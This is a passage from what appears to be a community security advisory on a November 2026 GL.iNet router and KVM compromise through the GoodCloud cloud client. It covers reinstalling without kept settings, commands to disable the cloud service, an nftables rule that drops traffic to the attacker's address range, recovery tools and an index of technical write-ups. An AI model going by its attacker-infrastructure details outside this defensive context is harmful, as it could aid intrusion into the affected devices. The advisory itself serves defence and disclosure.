  clean-up does not look at it. *Corrected 23 November:* one forum user with weekly backups
  reports that the rewrite left the file's content unchanged ([post 22](https://forum.gl-inet.com/t/found-other-malware-while-looking-for-11-20-evidence/73097/22)); we cannot check that
  on ours. See [The older backdoor, step by step](#the-older-backdoor-step-by-step).
- **An update does not take back what was read.** A router with the remote shell or the older
  backdoor has had everything on it readable by someone else: its SSH keys, the Wi-Fi and admin
  passwords, VPN keys and profiles, its Tailscale and ZeroTier identities, DDNS and cloud
  credentials. Keeping settings keeps exactly those. They have to be replaced whatever the
  firmware does.
- **So once any of [the signs](#the-signs-and-what-each-one-means) is found, do not keep
  settings.** What was read has to
  be replaced, what was changed cannot be told apart from your own settings, and where only the
  attacker's command ran we cannot show that nothing more was sent. We know of no case in which
  an upgrade with settings kept is the right way to recover such a router. Reinstall with
  "Keep Settings" switched off and set it up again, as in
  [If you find something](#if-you-find-something).

We compared the two GL-MT3000 builds file by file, and read the changed handler and the new
checker instruction by instruction, for that one model only. In the other sixteen builds we
read the clean-up script and searched the files; we have not read their handler.

**KVMs.** The same holds for the KVM firmware. On a test RM1, a boot script and an added SSH
key that we placed before the upgrade were both still there on 1.10.3 after an upgrade with
"Save current configuration" ticked, and the script ran at the first boot. Details and what to
do are in [docs/kvm-firmware.md](docs/kvm-firmware.md).

Because of the unaddressed weakness we are leaving GoodCloud switched off on the routers we
look after, also after updating. With GoodCloud off on the router, the cloud client does not run.

## Reducing exposure until fixed firmware is installed

This is temporary hardening. It does not clean a device that was already hit; for that, see
[If you find something](#if-you-find-something).

- Switch GoodCloud off on the device itself. On the router firmware we read, the cloud client only
  starts when GoodCloud is enabled on the device. In the admin panel that is the GoodCloud
  switch. Over SSH, this is what we ran on a GL-AXT1800 on 4.8.3, after which the
  client was no longer running and no longer set to start:

  ```
  /etc/init.d/gl-cloud stop
  uci set gl-cloud.@cloud[0].enable='0'
  uci commit gl-cloud
  /etc/init.d/gl-cloud disable
  ```

  The device disappears from GoodCloud until you turn it back on. Make sure you have another way
  to reach a remote device first.
- To also drop traffic to the address range seen in the remote-shell cases, on firmware that uses
  nftables (run on the same router; it lasts until the next reboot):

  ```
  nft insert rule inet fw4 output ip daddr 170.39.226.0/24 counter drop
  ```
- On a KVM, switch the cloud service off in its settings if you do not need it. A forum user
  reports the switch is under "More Settings"; we have not checked where it is on each model.

  *Added 27 November 2026: how to do it, and how to check that it worked.* Tested on a GL-RM1 on
  firmware 1.10.3.

  **The easy way** is the cloud switch in the KVM's own web page. On our test unit, switching it
  off stopped the cloud service and it stayed off.

  **To do it by hand, or to check the result,** open the KVM's terminal (web page: Toolbox →
  Terminal → Access) and type these three lines. They turn the cloud setting off and stop the two
  services that use it:

  ```
  jq '.enable = false' /etc/glinet/gl-cloud.conf > /tmp/gl-cloud.conf && cp /tmp/gl-cloud.conf /etc/glinet/gl-cloud.conf
  /etc/init.d/S99gl-cloud stop
  /etc/init.d/S99rtty stop
  ```

  Then check:

  ```
  jq '.enable' /etc/glinet/gl-cloud.conf
  ps -ef | grep -E 'gl-cloud|check_cloud|rtty' | grep -v grep
  ```

  The first should print `false`. The second should print nothing at all. On our unit both were
  still true after a restart. To undo it, use the cloud switch in the web page.

  **A new or freshly reinstalled KVM has the cloud switched ON** (read in the GL-RM1 1.10.2
  firmware image). It can connect as soon as it has internet, before you have opened its
  settings. So do it in this order: keep the KVM off the
  internet (block it at your router, or plug it into a network with no internet), install the
  firmware from a file through the KVM's own web page, switch the cloud off, check, and only
  then let it online.

  **Blocking a list of addresses is not a safe substitute.** By our reading of its files, the KVM
  first asks one GL.iNet server which other servers to use, so no fixed list of names covers
  everything it may contact. We know
  of no official list.

  **Removing the KVM from your GoodCloud account does not switch this off.** A GL.iNet staff
  member reported a removed device connecting again until the cloud was disabled on the device
  itself ([GL.iNet's statements](docs/gl-statements.md)).

  Limits: one unit, one model, one firmware version. The other KVM models were not tested.
- Do not rely on "I never used AstroWarp" or "remote access was off": the affected code runs
  regardless.

## Firmware downloads

- GL.iNet's own download pages are linked from its
  [security notice](https://forum.gl-inet.com/t/2026-11-20-gl-inet-security-notice-goodcloud-kvm-routers/73056).
- Our community mirror at <https://gl-fw.remotetohome.io/> keeps stable, beta and older builds for
  GL.iNet routers and KVMs in one place, including the KVM security builds. File checksums are
  verified automatically against the files GL.iNet publishes. It is useful when you need a specific
  build, an older one to compare against, or a copy that stays available.

Check which build you are installing: GL.iNet has more than one build under the same version
number, and for KVMs what the 1.10.2 build does differs by model. See
[docs/kvm-firmware.md](docs/kvm-firmware.md).

## Recovery tools

Two RemoteToHome projects for the cases GL.iNet's "factory reset and set up again" advice does
not cover, mainly devices that are far away (*note, 25 November:* that was GL.iNet's advice
in its notice as edited on 21 November at 10:35 UTC; since 23 November its site notice says,
where access is known or suspected, to reinstall without keeping settings and set the device up
again by hand):

- **[gl-portable-backup](https://github.com/RemoteToHome-io/gl-portable-backup)**, a backup and
  restore plugin. [Version 1.1.1](https://github.com/RemoteToHome-io/gl-portable-backup/releases/tag/v1.1.1)
  (21 November) adds a read-only `gl-portable-backup check` for the indicators on this page, and
  every backup runs it. Its result is `indicators`, `inconclusive` or `none`. A backup taken from
  a router with indicators is kept as a record only: its file name carries `-COMPROMISED-` and
  it cannot be restored. A result of `none` does not show that the router was never compromised.
  Its README says which modes and firmware versions have been tested; read that before relying
  on it.
- **gl-remote-rebuild** (not yet released, in design): wipe and reinstall a remote router and
  bring remote access back on first boot, carrying across only a short, inspected list of
  settings.

## More detail

- [docs/cleanup-test.md](docs/cleanup-test.md): what we planted on a test router and what was
  still there after an upgrade with settings, a factory reset and a reinstall, marker by marker.
- [docs/technical-breakdown.md](docs/technical-breakdown.md): the long version: the flaw line by
  line, how it was read, its history back to December 2024, what was sent through it, the older
  backdoor in detail, and the fix
- [docs/findings.md](docs/findings.md): every finding, its source, and how it was checked
- [docs/goodcloud-device-log.md](docs/goodcloud-device-log.md): the attack as GoodCloud's own
  Device Logs record it, the first calls on 19 November, and how an owner can check a device
  there without SSH
- [docs/inferences.md](docs/inferences.md): what the data suggests where no fact settles it:
  whether the two operations are linked, what the attacker's most common command was for,
  whether the calls of 19 November were a trial run, and how long the older backdoor was
  prepared. Reasoning, kept apart from the findings and labelled as such
- [docs/field-survey.md](docs/field-survey.md): devices checked so far, by model and firmware
- [docs/router-reverse-shell.md](docs/router-reverse-shell.md): the remote shell, the cloud command behind it and which routers have that code
- [docs/attacker-infrastructure.md](docs/attacker-infrastructure.md): what is known about the address the shells
  connected to, and the abuse report
- [docs/attacker-messages.md](docs/attacker-messages.md): every message and command the attacker
  sent to routers on 20 and 21 November, verbatim, with counts by model, and what was typed into
  the reverse shells ([tools/memory-scan](tools/memory-scan))
- [docs/gl-helper-implant.md](docs/gl-helper-implant.md): the KVM implant as forum users took it
  apart: installer, servers, files, persistence, hashes, what to look for, and how GL.iNet's
  clean-up compares
- [docs/older-backdoor-loader.md](docs/older-backdoor-loader.md): the older backdoor's loader decoded:
  the string hiding, every command it builds, what it sends, what its servers answered, and a
  decoder ([tools/ulogd-decode](tools/ulogd-decode)) to run on your own sample
- [docs/older-backdoor-second-stage.md](docs/older-backdoor-second-stage.md): the second stage
  (`ujaild`): what it can do, its servers and how they are hidden, what 47 memory images show,
  and detection rules ([tools/ujaild](tools/ujaild))
- [docs/open-weaknesses.md](docs/open-weaknesses.md): what the fixed firmware does not close: the
  other commands the cloud channel accepts, the remote terminal, a lead in the fixed handler, a
  flaw in a DDNS helper, and what would close them
- [docs/gl-statements.md](docs/gl-statements.md): what GL.iNet has said in public, version by
  version, with what was added and removed, and every staff post in the forum
- [docs/kvm-firmware.md](docs/kvm-firmware.md): what the KVM 1.10.2 and 1.10.3 firmware does and
  does not do
- [docs/monitoring.md](docs/monitoring.md): how to record what the cloud sends a device
- [tools/cloud-watch](tools/cloud-watch): a small watcher for a test device

## What is deliberately not published here

One thing only: a further weakness in the cloud client that the fixed firmware we read does not
address. (The other weaknesses we know of are published in
[docs/open-weaknesses.md](docs/open-weaknesses.md).) We formally reported it to GL.iNet on 22 November 2026
and told them we would withhold it until it is fixed. Reports that include it will be edited
before they are merged.

Everything else we have verified is on these pages in full, including the attacker's messages
as recovered ([technical breakdown](docs/technical-breakdown.md#what-was-sent-through-it-on-20-and-21-november))
and the older backdoor's files, servers and protocol
([The older backdoor, step by step](#the-older-backdoor-step-by-step)). Until 22 November we
also held back the name of the cloud command and the handler; until 23 November, the text of
the attacker's messages. Both are public elsewhere and both are now here.

We never publish anything that identifies an owner or a device: no names, addresses, network
ids, serial numbers or hardware addresses. In the attacker's messages the router's identifier is
replaced by `<id>`.

## Credits

- [Admon](https://forum.gl-inet.com/u/admon/) for the triage script, the first firmware
  comparison, and the guide at gl-i.net.
- Forum users kosrkosr and TakashiSasaki for the first two remote-shell reports, and AdamK for the
  connection checks.
- Everyone who posted output in the GL.iNet forum threads.

## Disclaimer and licence

Provided as is, without warranty. Nothing here can prove a device is clean.

Copyright (c) 2026 RemoteToHome Consulting. Text and tools are released under the
[GNU General Public License, version 3](LICENSE).
